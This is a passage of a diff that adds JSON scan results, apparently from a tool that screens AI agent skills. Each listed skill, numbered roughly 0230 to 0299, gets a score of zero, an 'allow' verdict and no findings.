+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0230",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0231",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0232",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0233",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0234",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0235",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0236",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0237",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0238",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0239",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0240",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0241",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0244",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0246",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0247",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0248",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0249",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0251",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0252",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0254",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0255",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0256",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0258",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0259",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0260",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0261",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0262",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0263",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0264",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0265",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0266",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0267",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0269",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0270",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0271",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0272",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0273",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0274",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0275",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0276",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0277",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0278",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0279",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0280",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0282",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0283",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0284",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0285",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0286",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0287",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0288",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0289",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0290",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0291",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0292",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0293",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0294",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0295",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0296",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0297",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0298",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    },
+    {
+      "name": "skill-0299",
+      "score": 0,
+      "verdict": "allow",
+      "findings": []
+    }
+  ]
+}
